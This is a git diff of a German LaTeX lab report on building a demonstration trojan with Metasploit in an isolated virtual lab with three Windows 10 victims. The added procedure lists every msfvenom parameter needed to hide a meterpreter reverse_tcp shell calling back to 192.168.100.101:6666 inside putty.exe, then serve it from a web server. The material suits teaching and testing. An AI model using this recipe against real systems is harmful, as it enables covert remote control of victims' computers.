@@ -6,22 +6,54 @@ Framework genutzt um einen beispielhaften Trojaner zu erstellen.
 Für einen möglichst einfachen und gleichzeitig verhältnismäßig sicheren Ablauf
 wird das Labor in einer virtualisierten Umgebung ohne Verbindung zum Internet durchgeführt.
 Beispielsweise VirtualBox bietet hierfür eine \glqq Internal Networking\grqq{} Einstellung, unter welcher lediglich die virtuellen Maschinen untereinander kommunizieren können.
-Ist beispielsweise der Angreifer ein realer Computer und dient gleichzeitig dem Opfer als Host, so kann durch ein \glqq Host-ony networking\grqq{} sichergestellt werden, dass zumindest der Gast keinen Zugriff zum Internet hat.
 
 \begin{figure}[h!]
 	\centering
 	\begin{tikzpicture}[,>={Stealth[round]},shorten >=1pt,auto,semithick]
 		\tikzstyle{pc}=[rectangle,draw=black,minimum size=30pt,inner sep=5pt,align=center]
 
-		\node[pc]      (A) at (1,0)  {Angreifer \\ (Kali Linux, Metasploit)};
-		\node[pc]      (V) at (5,0)  {Opfer\\(Windows 10)};
+		\node[pc]      (A) at (1,2)  {Angreifer \\ (Kali Linux, Metasploit)};
+		\node[pc]      (V1) at (5,4)  {Opfer 1\\(Windows 10, Veraltet)};
+		\node[pc]      (V2) at (5,2)  {Opfer 2\\(Windows 10, Avira)};
+		\node[pc]      (V3) at (5,0)  {Opfer 3\\(Windows 10, Aktuell)};
 
-		\path (A) edge (V) ;
+		\path (A) edge (V1) ;
+		\path (A) edge (V2) ;
+		\path (A) edge (V3) ;
+
 	\end{tikzpicture}
 	\caption{Übersicht} \label{fig:uebersicht}
 \end{figure}
 
-An der praktischen Durchführung sind, wie in Abbildung \ref{fig:uebersicht} dargestellt, zwei Computer beteiligt.
+An der praktischen Durchführung sind, wie in Abbildung \ref{fig:uebersicht} dargestellt, vier Computer beteiligt.
 Auf dem Angreifer läuft das Betriebssystem \glqq Kali Linux\grqq{}, welches bereits das Metasploit Framework enthält.
 Außerdem wird der späteren Trojaner über einen Apache Webserver an das Opfer zu übergeben.
-Das Opfer nutzt das weit verbreitete Betriebssystem Windows 10.
+Die Opfer nutzen das weit verbreitete Betriebssystem Windows 10. Mit folgenden Unterschieden:
+
+\begin{itemize}
+	\item \textbf{Opfer 1}: Veraltete Version von Windows 10 (Stand: 27.04.2018)
+	\item \textbf{Opfer 2}: Veraltete Version von Windows 10, allerdings mit Avira Free Security Suite (Version 15.0.36.163)
+	\item \textbf{Opfer 3}: Aktualisierte Version von Windows 10 (Stand: 04.05.2018)
+\end{itemize}
+
+\subsubsection{Ablauf}\label{sec:praktischeDurchfuehrung-ablauf}
+Zunächst wird auf dem Angreifer der Trojaner erstellt.
+Ziel ist es den Payload \code{windows/meterpreter/reverse\_tcp} in ein normales Programm (hier das bekannte \code{putty.exe}) einzuschleusen.
+Dies geschieht mit dem Befehl \code{msfvenom}. Wobei folgende parameter gesetzt werden:
+\begin{itemize}
+	\item \textbf{Payload}: \code{-p windows/meterpreter/reverse\_tcp}
+	      \begin{itemize}
+		      \item  \textbf{Angreifer-IP}: \code{lhost=192.168.100.101}
+		      \item \textbf{Angreifer-Port}: \code{lport=6666}
+		  \end{itemize}
+	\item \textbf{Architektur}: \code{-a x86}
+	\item \textbf{Plattform}: \code{--platform windows}
+	\item \textbf{Dateiformat}: \code{-f exe}
+	\item \textbf{Vorlage}: \code{-x putty.exe}
+	\item \textbf{Vorlage innerhalb des Trojaners ausführen}: \code{-k}
+	\item \textbf{Ausgabe (Trojaner)}: \code{-o puttyX.exe}
+\end{itemize}
+
+
+Der erstellte Trojaner wird in das Wurzelverzeichnis des Webservers \code{/var/www/html} kopiert um diesen einfach, und gleichzeitig verhältnismäßig realitätsnah an die Opfer zu übermitteln.
+
